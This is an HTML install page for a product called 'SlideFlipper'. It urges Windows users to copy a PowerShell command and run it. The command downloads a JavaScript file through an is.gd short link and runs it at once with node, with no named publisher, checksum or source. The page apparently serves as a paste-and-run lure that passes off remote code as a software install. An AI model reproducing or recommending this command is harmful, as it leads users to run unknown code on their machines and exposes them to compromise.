<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>SlideFlipper Windows Install</title>
  <style>
    :root {
      color-scheme: light;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    }
    body {
      margin: 0;
      background: #ffffff;
      color: #111111;
    }
    main {
      max-width: 760px;
      margin: 0 auto;
      padding: 32px 20px 48px;
    }
    h1 {
      font-size: 28px;
      line-height: 1.1;
      margin: 0 0 8px;
    }
    p {
      font-size: 16px;
      line-height: 1.5;
      margin: 0 0 20px;
      color: #444;
    }
    .panel {
      border: 1px solid #e5e7eb;
      border-radius: 16px;
      padding: 16px;
      background: #f8fafc;
    }
    pre {
      margin: 0;
      white-space: pre-wrap;
      word-break: break-word;
      font-size: 15px;
      line-height: 1.6;
      font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
    }
    .actions {
      display: flex;
      gap: 12px;
      margin-top: 16px;
      flex-wrap: wrap;
    }
    button {
      appearance: none;
      border: 0;
      border-radius: 999px;
      padding: 12px 18px;
      font-size: 15px;
      font-weight: 600;
      background: #111827;
      color: #fff;
      cursor: pointer;
    }
    .note {
      margin-top: 14px;
      font-size: 13px;
      color: #666;
    }
    #copied {
      min-height: 20px;
      margin-top: 10px;
      font-size: 14px;
      color: #15803d;
    }
  </style>
</head>
<body>
  <main>
    <h1>Install SlideFlipper on Windows</h1>
    <p>Copy the command below, paste it into PowerShell, then press Enter.</p>
    <div class="panel">
      <pre id="cmd">cd $HOME\Desktop; iwr https://is.gd/aUbjFM -OutFile slideflipper.js; node slideflipper.js</pre>
      <div class="actions">
        <button id="copyBtn" type="button">Copy</button>
      </div>
      <div id="copied"></div>
      <div class="note">If PowerShell is already open, just paste and run the command there.</div>
    </div>
  </main>
  <script>
    const text = document.getElementById('cmd').textContent;
    const copied = document.getElementById('copied');
    document.getElementById('copyBtn').addEventListener('click', async () => {
      try {
        await navigator.clipboard.writeText(text);
        copied.textContent = 'Copied. You can now paste it into PowerShell.';
      } catch (err) {
        copied.textContent = 'Copy failed. Press and hold the command to copy manually.';
      }
    });
  </script>
</body>
</html>
